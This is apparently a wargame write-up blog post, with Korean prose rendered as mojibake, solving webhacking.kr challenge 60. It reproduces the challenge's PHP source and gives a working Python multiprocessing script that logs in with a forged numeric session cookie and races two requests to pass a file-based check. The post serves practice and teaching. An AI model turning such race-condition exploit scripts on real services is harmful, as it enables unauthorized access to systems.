---
title: "[webhacking.kr] 60ë²ˆ ë¬¸ì œ í’€ì´[Race Condition]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - race-condition
  - python
toc: true
toc_sticky: true
toc_label: "60ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 60ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/154058188-2f960c04-e238-46d9-8efd-2f1a30bd92b2.png){: .align-center}

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
  login_chk();

  # ì¿ í‚¤ì— PHPSESSIDê°€ ìˆ«ì ì¸ì§€ í™•ì¸
  echo "Your idx is {$_SESSION['idx']}<hr>";
  if(!is_numeric($_COOKIE['PHPSESSID'])) exit("Access Denied<br><a href=./?view_source=1>view-source</a>");
  sleep(1);
  
  # mode = authì¸ ê²½ìš° 
  if($_GET['mode']=="auth"){
    echo("Auth~<br>");
    $result = file_get_contents("./readme/{$_SESSION['idx']}.txt");
    if(preg_match("/{$_SESSION['idx']}/",$result)){
      echo("Done!");
      unlink("./readme/{$_SESSION['idx']}.txt");
      solve(60);
      exit();
    }
  }

  # ê·¸ëƒ¥ ì ‘ì†í–ˆì„ ê²½ìš°
  $p = fopen("./readme/{$_SESSION['idx']}.txt","w");
  fwrite($p,$_SESSION['idx']);
  fclose($p);
  if($_SERVER['REMOTE_ADDR']!="127.0.0.1"){
    sleep(1);
    unlink("./readme/{$_SESSION['idx']}.txt");
  }
?>
```

<br>

# ë¬¸ì œ í’€ì´
ìœ„ì˜ php ì†ŒìŠ¤ì½”ë“œë¥¼ í•´ì„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

1. ê·¸ëƒ¥ ì ‘ì†í–ˆì„ ê²½ìš°
```php
 $p = fopen("./readme/{$_SESSION['idx']}.txt","w");
  fwrite($p,$_SESSION['idx']);
  fclose($p);
  if($_SERVER['REMOTE_ADDR']!="127.0.0.1"){
    sleep(1);
    unlink("./readme/{$_SESSION['idx']}.txt");
  }
```
ì €ì˜ ì¸ë±ìŠ¤ ê°’ì€ **54522** ì…ë‹ˆë‹¤. 
ì²˜ìŒ ì ‘ì†í•˜ë©´ **./readme/54522.txt** íŒŒì¼ì„ ìƒì„±í•˜ê³ , í•´ë‹¹ íŒŒì¼ì˜ ì €ì˜ ì¸ë±ìŠ¤ì¸ **54522**ë¥¼ ì ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  REMOTE_ADDR ì€ ì €ì˜ IPë¼ì„œ 127.0.0.1ì´ ì•„ë‹ˆë¯€ë¡œ unlink í•¨ìˆ˜ë¡œ **1ì´ˆë’¤ì—** í•´ë‹¹ íŒŒì¼ì„ ì§€ì›ë‹ˆë‹¤.


2. mode=auth ë¡œ ì ‘ì†í•œ ê²½ìš°
```php
  if($_GET['mode']=="auth"){
    echo("Auth~<br>");
    $result = file_get_contents("./readme/{$_SESSION['idx']}.txt");
    if(preg_match("/{$_SESSION['idx']}/",$result)){
      echo("Done!");
      unlink("./readme/{$_SESSION['idx']}.txt");
      solve(60);
      exit();
    }
  }
```

**./read/54522.txt** íŒŒì¼ì—ì„œ ì €ì˜ ì¸ë±ìŠ¤ ê°’ì¸ 54522ë¥¼ ë¹„êµí•˜ì—¬ ë˜‘ê°™ìœ¼ë©´ ë¬¸ì œê°€ í´ë¦¬ì–´ ë©ë‹ˆë‹¤.

ì¦‰, ì •ë¦¬í•˜ë©´ modeë¥¼ ì…ë ¥í•˜ì§€ ì•Šê³  ì ‘ì†í•œ ë’¤ì—, 1ì´ˆ ì´ë‚´ë¡œ mode=authë¥¼ ì£¼ë©´ì„œ ì¬ì ‘ì† í•˜ë©´ í’€ë¦½ë‹ˆë‹¤.

ë¬¸ì œë¥¼ í’€ë•Œ ë™ì¼ ë¸Œë¼ìš°ì €ì—ì„œ ì°½ì„ 2ê°œ í‚¤ë©´, 2ê°œë¥¼ ë™ì‹œì— ì ‘ì†í•´ë„ ë¬¸ì œê°€ í’€ë¦¬ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë²ˆ ë¬¸ì œë¥¼ í’€ ë•ŒëŠ” í•˜ë‚˜ì˜ ë¸Œë¼ìš°ì €ëŠ” ì›ë˜ ì“°ë˜ ë¸Œë¼ìš°ì €ë¥¼ ì“°ê³ , ë‹¤ë¥¸ ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ì„œ 1ì´ˆì•ˆì— ì ‘ì†í•˜ë©´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

ì €ëŠ” íŒŒì´ì¬ì„ ì´ìš©í•´ì„œ ì´ë¥¼ í’€ì—ˆìŠµë‹ˆë‹¤.

íŒŒì´ì¬ì˜ multiprocessing ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ë¥¼ 2ê°œ ìƒì„±í•œë‹¤ìŒ í•˜ë‚˜ëŠ” ê·¸ëƒ¥ì ‘ì†, ë‹¤ë¥¸ í•˜ë‚˜ëŠ” mode=authë¥¼ ì£¼ë©´ì„œ ì ‘ì†ì„ í•˜ì˜€ìŠµë‹ˆë‹¤.

```python
import requests
from multiprocessing import Pool
import random
import time

random.seed(time.time())

# ì¿ í‚¤ì˜ PHPSESSIDë¥¼ ì •ìˆ˜ê°’ì´ ë“¤ì–´ê°€ë„ë¡ í•´ì¤€ë‹¤.
def login(session):
    session.get("https://webhacking.kr")
    rand = str(random.randint(1,10000000))
    session.cookies.clear()
    session.cookies.update({'PHPSESSID':rand})
    datas = {}
    print(" ------------ login ----------------------")
    datas['id'] = 'oksusu98'
    datas['pw'] = 'ë¹„ë°€ë²ˆí˜¸'
    response = session.post("https://webhacking.kr/login.php?login",data=datas)
    if( "<script>location.href='/';</script>" in response.text):
        print("login success : ",datas['id'])
    else:
        print("login Fail")
        exit(0)


def solve(param):
    url = 'https://webhacking.kr/challenge/web-37/'
    session = requests.session()
    login(session)
#    print(session.cookies)
    response = session.get(url,params={'mode':param})
    return response.text
    


if __name__ == '__main__':
    p = Pool(4)
    ret1 = p.apply_async(solve,('make',))
    time.sleep(0.3)
    ret2 = p.apply_async(solve,('auth',))

    print(ret1.get())
    print(ret2.get())

    p.close()
    p.join()

```

![image](https://user-images.githubusercontent.com/33647663/154062824-15d3b628-501f-41fb-9f80-793a49364adf.png){: .align-center}